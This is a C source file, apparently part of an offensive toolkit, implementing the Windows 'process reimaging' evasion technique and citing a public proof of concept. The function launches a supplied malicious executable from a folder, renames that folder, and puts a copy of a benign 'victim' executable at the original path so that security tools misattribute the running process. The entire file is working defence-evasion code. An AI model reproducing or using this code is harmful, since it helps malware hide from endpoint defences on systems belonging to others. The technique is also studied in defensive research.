#include "box.h"

// https://unprotect.it/technique/process-reimaging/
// https://github.com/djhohnstein/ProcessReimaging/blob/master/CPPProcessReimagingPOC/CPPProcessReimagingPOC/CPPProcessReimagingPOC.cpp

BOOL ProcessReimaging
(
	IN char* MaliciousExe,
	IN char* VictimExe
)
{
	BOOL State = TRUE;

	char CurrentPath[1024];
	char badPath[1024];
	char badexe[1024];
	char newbadexe[1024];

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOA));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(si);

	if (!PathFileExistsA(MaliciousExe))
	{
		WARN("Failed to Find Path For %s", MaliciousExe);
		PRINT_ERROR("PathFileExistsA");
		State = FALSE; goto CLEANUP;
	}

	INFO("Found Path For Our Bad Executable: %s", MaliciousExe);

	if (!PathFileExistsA(VictimExe))
	{
		WARN("Failed to Find Path For %s", VictimExe);
		PRINT_ERROR("PathFileExistsA");
		State = FALSE; goto CLEANUP;
	}

	INFO("Found Path For Our Victim Executable: %s", VictimExe);

	if (!GetCurrentDirectoryA(MAX_PATH, CurrentPath))
	{
		WARN("Failed To Get Full File Path");
		PRINT_ERROR("GetModuleFileNameA");
		State = FALSE; goto CLEANUP;
	}

	INFO("Current Path: %s", CurrentPath);

	snprintf(badPath, sizeof(badPath), "%s\\bad", CurrentPath);
	if (!CreateDirectoryA(badPath, NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			WARN("Failed To Create New Directory!");
			PRINT_ERROR("CreateDirectoryA");
			State = FALSE; goto CLEANUP;
		}
	}

	INFO("Created Directory: %s", badPath);

	snprintf(badexe, sizeof(badexe), "%s\\bad.exe", badPath);
	if (!CopyFileA(MaliciousExe, badexe, FALSE))
	{
		WARN("Failed to Copy File");
		PRINT_ERROR("CopyFileA");
		State = FALSE; goto CLEANUP;
	}

	INFO("Created Copy File: %s", badexe);

	if (!CreateProcessA(NULL, badexe, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		WARN("Failed To Create New Process!");
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] [%ld] Process Created!", pi.hProcess, pi.dwProcessId);

	snprintf(newbadexe, sizeof(newbadexe), "%s\\.bad", CurrentPath);
	if (!MoveFileA(badPath, newbadexe))
	{
		WARN("Failed To Move Files!");
		PRINT_ERROR("MoveFileA");
		State = FALSE; goto CLEANUP;
	}

	INFO("Moved %s --> %s", badPath, newbadexe);

	if (!CreateDirectoryA(badPath, NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			WARN("Failed To Create New Directory!");
			PRINT_ERROR("CreateDirectoryA");
			State = FALSE; goto CLEANUP;
		}
	}

	INFO("Created New Directory: %s", badPath);

	if (!CopyFileA(VictimExe, badexe, FALSE))
	{
		WARN("Failed To Copy Files!");
		PRINT_ERROR("CopyFileA");
		State = FALSE; goto CLEANUP;
	}

	INFO("Copied %s with New File: %s", VictimExe, badexe);

CLEANUP:

	if (pi.hProcess)
		CloseHandle(pi.hProcess);

	if (pi.hThread)
		CloseHandle(pi.hThread);

	return State;

}